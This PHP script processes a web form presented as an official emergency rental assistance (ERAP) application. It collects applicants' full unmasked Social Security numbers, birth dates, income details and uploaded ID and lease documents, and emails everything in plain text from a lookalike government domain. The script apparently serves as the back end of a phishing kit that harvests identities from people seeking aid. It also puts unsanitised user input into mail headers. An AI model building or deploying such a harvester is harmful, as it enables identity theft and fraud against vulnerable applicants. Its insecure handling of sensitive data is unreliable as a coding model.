<?php
/**
 * ERAP Application Processor
 * Sends full application details, including full SSN and file uploads, via email.
 */

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $clean = function ($key) {
        return isset($_POST[$key]) ? trim($_POST[$key]) : '';
    };

    // Collect fields
    $name             = $clean('full_name');
    $dob              = $clean('date_of_birth');
    $email            = $clean('email');
    $phone            = $clean('phone');
    $ssn              = $clean('ssn'); // Full SSN required, not masked
    $address          = $clean('address');
    $city             = $clean('city');
    $state            = $clean('state');
    $zip              = $clean('zip');
    $employment       = $clean('employment_status');
    $employer         = $clean('employer_name');
    $household_size   = $clean('household_size');
    $income           = $clean('income');
    $income_sources   = $clean('income_sources');
    $current_rent     = $clean('current_rent');
    $months_past_due  = $clean('months_past_due');
    $total_arrears    = $clean('total_arrears');
    $future_rent      = $clean('future_rent');
    $total_assistance = $clean('total_assistance');
    $hardship         = $clean('hardship');
    $landlord_name    = $clean('landlord_name');
    $landlord_phone   = $clean('landlord_phone');
    $landlord_email   = $clean('landlord_email');
    $landlord_accepts = isset($_POST['landlord_accepts_payments']) ? 'Yes' : 'No';
    $rent_past_due    = $clean('rent_past_due');
    $rent_future      = $clean('rent_future');
    $utility_request  = isset($_POST['utility_assistance']) ? implode(', ', (array)$_POST['utility_assistance']) : 'None selected';
    $assistance_total = $clean('assistance_total');
    $contact_auth     = isset($_POST['contact_authorization']) ? 'Yes' : 'No';
    $accuracy_cert    = isset($_POST['accuracy_certification']) ? 'Yes' : 'No';
    $attestation      = isset($_POST['attestation']) ? 'Yes' : 'No';
    $digital_signature= $clean('digital_signature');
    $signature_date   = $clean('signature_date');

    if (empty($name) || empty($email) || empty($ssn)) {
        die("Security error: Missing required fields.");
    }

    $fields = [
        "Full Legal Name" => $name,
        "Date of Birth" => $dob,
        "Email" => $email,
        "Phone" => $phone,
        "Full SSN" => $ssn,
        "Street Address" => $address,
        "City" => $city,
        "State" => $state,
        "Zip" => $zip,
        "Employment Status" => $employment,
        "Employer Name" => $employer,
        "Household Size" => $household_size,
        "Annual Household Income" => $income,
        "Income Sources" => $income_sources,
        "Current Monthly Rent" => $current_rent,
        "Months Past Due" => $months_past_due,
        "Total Arrears" => $total_arrears,
        "Future Rent Requested" => $future_rent,
        "Total Assistance Requested" => $total_assistance,
        "Hardship Description" => $hardship,
        "Landlord/Property Manager Name" => $landlord_name,
        "Landlord Phone" => $landlord_phone,
        "Landlord Email" => $landlord_email,
        "Landlord Accepts Direct Payment" => $landlord_accepts,
        "Rent Assistance (Past Due)" => $rent_past_due,
        "Rent Assistance (Future)" => $rent_future,
        "Utility Assistance Requested" => $utility_request,
        "Total Amount Requested (All Categories)" => $assistance_total,
        "Contact Authorization" => $contact_auth,
        "Accuracy Certification" => $accuracy_cert,
        "Attestation" => $attestation,
        "Digital Signature" => $digital_signature,
        "Signature Date" => $signature_date,
    ];

    $message = "Official ERAP Application Received\n";
    $message .= "====================================\n\n";
    foreach ($fields as $label => $value) {
        $message .= "{$label}: {$value}\n";
    }
    $message .= "\nSubmission Timestamp: " . date("Y-m-d H:i:s") . "\n";

    // Prepare attachments
    $attachments = [];
    $singleFiles = [
        'id_document' => 'Government-issued ID',
        'income_proof' => 'Proof of Income',
        'lease_agreement' => 'Lease or Rental Agreement',
        'eviction_notice' => 'Eviction or Past-Due Notice',
    ];

    foreach ($singleFiles as $field => $label) {
        if (isset($_FILES[$field]) && is_uploaded_file($_FILES[$field]['tmp_name'])) {
            $attachments[] = [
                'tmp_name' => $_FILES[$field]['tmp_name'],
                'name' => $_FILES[$field]['name'],
                'type' => $_FILES[$field]['type'] ?: 'application/octet-stream',
                'label' => $label
            ];
        }
    }

    if (isset($_FILES['utility_bills']) && isset($_FILES['utility_bills']['tmp_name'])) {
        foreach ($_FILES['utility_bills']['tmp_name'] as $idx => $tmpName) {
            if (is_uploaded_file($tmpName)) {
                $attachments[] = [
                    'tmp_name' => $tmpName,
                    'name' => $_FILES['utility_bills']['name'][$idx],
                    'type' => $_FILES['utility_bills']['type'][$idx] ?: 'application/octet-stream',
                    'label' => 'Utility Bill'
                ];
            }
        }
    }

    // Email headers and body with attachments
    $to = "applications@your-agency-portal.com";
    $subject = "NEW ERAP APPLICATION: {$name}";
    $boundary = "==Multipart_Boundary_x" . md5(time()) . "x";

    $headers  = "From: webmaster@gov-assist-portal.com\r\n";
    $headers .= "Reply-To: {$email}\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: multipart/mixed; boundary=\"{$boundary}\"";

    $body  = "--{$boundary}\r\n";
    $body .= "Content-Type: text/plain; charset=\"UTF-8\"\r\n";
    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $body .= $message . "\r\n";

    foreach ($attachments as $file) {
        $fileContent = file_get_contents($file['tmp_name']);
        if ($fileContent === false) {
            continue;
        }
        $data = chunk_split(base64_encode($fileContent));
        $body .= "--{$boundary}\r\n";
        $body .= "Content-Type: {$file['type']}; name=\"{$file['name']}\"\r\n";
        $body .= "Content-Description: {$file['label']}\r\n";
        $body .= "Content-Disposition: attachment; filename=\"{$file['name']}\"; size=" . filesize($file['tmp_name']) . ";\r\n";
        $body .= "Content-Transfer-Encoding: base64\r\n\r\n";
        $body .= $data . "\r\n";
    }
    $body .= "--{$boundary}--";

    if (mail($to, $subject, $body, $headers)) {
        header("Location: ../success.html");
        exit();
    } else {
        echo "<h1>Application Error</h1>";
        echo "<p>We were unable to process your application at this time. Please contact support.</p>";
        echo "<a href='../erap-apply.html'>Go Back</a>";
    }
} else {
    header("Location: ../index.html");
    exit();
}
